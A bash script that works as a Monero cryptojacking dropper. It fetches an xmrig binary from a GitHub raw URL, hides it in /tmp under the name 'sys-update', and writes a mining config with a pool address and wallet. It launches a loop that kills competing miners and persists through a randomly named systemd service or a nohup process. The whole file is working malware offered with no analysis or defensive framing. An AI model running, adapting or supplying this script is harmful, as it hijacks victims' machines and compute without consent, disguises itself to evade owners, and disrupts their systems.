#!/usr/bin/env bash

HOME_DIR="/tmp"
BASE_DOWNLOAD_URL="https://raw.githubusercontent.com/t69415778/test/refs/heads/main"

if ps aux | grep '[s]ys-update' &>/dev/null; then
  exit 0
fi

kill $(ps aux | grep terminate_miners | grep -v grep | awk '{print $2}') || true

download_file() {
  local url=$1
  local output=$2
  if command -v curl &>/dev/null; then
    curl -L -s -S "$url" -o "$output" || exit 1
  elif command -v wget &>/dev/null; then
    wget -q -O "$output" "$url" || exit 1
  elif command -v python3 &>/dev/null; then
    python3 -c "import urllib.request; urllib.request.urlretrieve('$url', '$output')" || exit 1
  elif command -v python2 &>/dev/null; then
    python2 -c "import urllib; urllib.urlretrieve('$url', '$output')" || exit 1
  else
    exit 1
  fi
  [ -s "$output" ] || exit 1
}

generate_random_string() {
  local length=12
  local chars=({a..z} {A..Z} {0..9})
  local random_string=""
  for _ in $(seq 1 "$length"); do
    random_string+="${chars[RANDOM % ${#chars[@]}]}"
  done
  echo "$random_string"
}

add_user_autostart() {
  nohup "$MINER_DIR/miner.sh" --config="$MINER_DIR/config.json" 2>/dev/null &
}

MINER_DIR=$(mktemp -d "$HOME_DIR/.miner-XXXXXX")

download_file "$BASE_DOWNLOAD_URL/xmrig" "$MINER_DIR/sys-update"
chmod +x "$MINER_DIR/sys-update"

cat > "$MINER_DIR/config.json" <<'EOL'
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": 100,
        "asm": true,
        "argon2-impl": null,
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 0,
    "donate-over-proxy": 0,
    "log-file": null,
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "pool.supportxmr.com:5555",
            "user": "46QET5yoU1NMAtRVN4jRtvRLVx1LAxPBLL1wnNJYBi6j3RNaKrXrC2xcUePtPvqTvbgAj7WxXdPRiQHiwHY3BhGM4UnRFhU",
            "pass": "REDIS",
            "rig-id": null,
            "nicehash": false,
            "keepalive": false,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "dns": {
        "ipv6": false,
        "ttl": 30
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
EOL

cat > /tmp/terminate_miners.sh << 'EOL'
#!/bin/bash
set -euo pipefail
miners=("xmrig" "cgminer" "bfgminer" "ethminer" "minerd" "cpuminer" "nicehash" "claymore" "phoenixminer" "ccminer")
while true; do
  for miner in "${miners[@]}"; do
    for pid in $(ps aux | grep "$miner" | grep -v "grep" | awk '{print $2}'); do
      kill -9 "$pid" || true
    done
  done
  sleep 60
done
EOL

chmod +x /tmp/terminate_miners.sh
/tmp/terminate_miners.sh &

cat >"$MINER_DIR/miner.sh" <<EOL
#!/usr/bin/env bash
set -euo pipefail
if ! ps aux | grep '[s]ys-update' &>/dev/null; then
  chmod +x "$MINER_DIR/sys-update"
  "$MINER_DIR/sys-update" -c "$MINER_DIR/config.json"
fi
EOL
chmod +x "$MINER_DIR/miner.sh"

RANDOM_SERVICE_NAME="miner_$(generate_random_string)"

if ! sudo -n true 2>/dev/null; then
  add_user_autostart
else
  if command -v systemctl &>/dev/null; then
    sudo bash -c "cat >/etc/systemd/system/${RANDOM_SERVICE_NAME}.service" <<EOL
[Unit]
Description=Monero miner service
After=network-online.target

[Service]
ExecStart=$MINER_DIR/sys-update --config=$MINER_DIR/config.json
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOL
    sudo systemctl daemon-reload
    sudo systemctl enable "${RANDOM_SERVICE_NAME}.service"
    sudo systemctl start "${RANDOM_SERVICE_NAME}.service"
  else
    add_user_autostart
  fi
fi
